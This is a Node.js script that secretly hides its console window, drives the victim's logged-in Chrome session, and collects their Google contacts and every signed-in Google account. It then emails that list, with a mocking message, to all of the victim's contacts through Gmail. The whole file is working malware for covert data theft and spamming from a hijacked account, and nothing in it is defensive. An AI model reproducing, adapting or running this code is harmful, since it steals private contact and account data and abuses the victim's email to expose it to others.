__dirname = process.cwd();
const { exec, execSync } = require('child_process');
const fs = require('fs');
const chromeHandler = require(`${__dirname}\\chrome_handler`);
(async() => {
    const user = process.argv.slice(2) || 0; //send to Default user

    exec(`nircmd.exe win hide process /${process.pid}`, {
        cwd: `${__dirname}\\chrome_handler\\bin`
    });
    console.log(`Using profile ${user}.`);
    const { browser, page, end } = await chromeHandler(); 
    const contacts = await getContacts(page, user);
    const accounts = await googleAccounts(page);
    contacts.filter(a => a.includes('.com'));

    await sendEmail(page, user, contacts, 'OwO, What\'s this?', `Notices your blugy wulgy. These are my accounts: ${accounts.join(', ')} and contacts: ${contacts.join(', ')}`);
    await end();
})().catch(console.log);

async function getContacts(page, user) {
    return new Promise(async(resolve, reject) => {
        page.on('console', async msg => {
            if(msg.text().includes('contacts-')) {
                const contacts = JSON.parse(msg.text().split('contacts-')[1]);
                resolve(contacts);
            }
        });

        page.once('load', async() => {
            await page.evaluate(() => {
                const loop = setInterval(() => {
                    const elements = document.querySelectorAll('.PDfZbf');
                    if(elements[elements.length-1]) {
                        const contacts = [];
                        for(const element of elements) 
                            contacts.push(element.innerText);
                        console.log('contacts-' + JSON.stringify(contacts));
                        clearInterval(loop);
                        return contacts; 
                    }
                }, 100);
            });
        });
        await page.goto(`https://contacts.google.com/u/${user}/other?hl=en`);
    });
}

async function googleAccounts(page) {
    return new Promise(async(resolve, reject) => {
        const accounts = [];
        page.on('load', async() => {
            await page.evaluate(() => {
                const loop = setInterval(() => {
                    const element = document.querySelector('#gb > div.gb_Ld.gb_5d.gb_Ud > div.gb_Zd.gb_Ta.gb_Kd.gb_2d.gb_0d > div.gb_Ue > div > div > a');
                    if(element) {
                        const a = element.outerHTML; 
                        console.log(a.slice(a.indexOf('(')+1, a.indexOf(')')));
                        clearInterval(loop);
                    }
                }, 100); 
            });
        });

        page.on('console', msg => {
            if(!msg.text().includes('@'))
                return;
            if(accounts.includes(msg.text()))
                return resolve(accounts);
            accounts.push(msg.text());
            callback();
        });    
        
        let i = 0;
        async function callback() {
            await page.goto(`https://myaccount.google.com/u/${i++}/?utm_source=account-marketing-page&utm_medium=go-to-account-button&pli=1`);
        }
        callback();
    });
}

async function sendEmail(page, user, contacts, subject, body) {
    return new Promise(async(resolve, reject) => {
        page.once('load', async() => {
            await page.evaluate(`const loop = setInterval(() => {const element = document.querySelector('.T-I.J-J5-Ji.aoO.v7.T-I-atl.L3');if(element) {element.click();clearInterval(loop);}}, 100);`); //send
            await page.evaluate(`setInterval(() => { const element = document.querySelector('.vh'); if(element && element.innerText.includes('sent')) { console.log('!SENT!') } }, 100);`); //when sent
        });
        console.log('Sending the email to:\n', contacts); 
        page.on('console', msg => {
            if(msg.text().includes('!SENT!'))
                resolve();
        });
        await page.goto(`https://mail.google.com/mail/u/${user}/?view=cm&fs=1&tf=1&to=${contacts.join('%2C')}&su=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`);
    });
}